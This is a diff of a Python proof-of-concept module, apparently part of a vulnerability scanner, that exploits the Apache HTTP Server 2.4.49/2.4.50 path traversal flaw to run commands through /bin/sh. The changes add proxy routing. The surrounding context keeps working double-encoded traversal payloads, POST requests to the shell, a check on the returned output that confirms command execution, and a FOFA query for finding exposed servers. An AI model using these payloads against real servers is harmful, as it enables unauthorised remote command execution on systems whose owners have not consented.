@@ -2,11 +2,10 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
+from Config.config_proxies import proxies
 from Config.config_requests import headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -21,7 +20,7 @@ FOFA_RULE='body="it works"'
 def poc(target):
     result = {}
     url = target+"/cgi-bin/"
-    res = requests.get(url, headers=headers, verify=False, timeout=5)
+    res = requests.get(url, headers=headers, verify=False, timeout=5,proxies=proxies)
     try:
         banner = res.headers['server']
     except:
@@ -33,14 +32,14 @@ def poc(target):
         # target_url = url + ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
         # 坑点在这
         target_url = url + ".%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
-        target_res = requests.post(target_url, headers=headers, data=data, verify=False, timeout=5)
+        target_res = requests.post(target_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
         if "uid" in target_res.text and "gid" in target_res.text and "groups" in target_res.text:
             result['CVE'] = NAME1
             result['target_url'] = url
             return result
     if banner != "" and "Apache/2.4.50" in banner:
         target_url = target + "/cgi-bin/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/.%%%33%32%%36%35/bin/sh"
-        target_res = requests.post(target_url, headers=headers, data=data, verify=False, timeout=5)
+        target_res = requests.post(target_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
         if "uid" in target_res.text and "gid" in target_res.text and "groups" in target_res.text:
             result['CVE'] = NAME2
             result['target_url'] = url
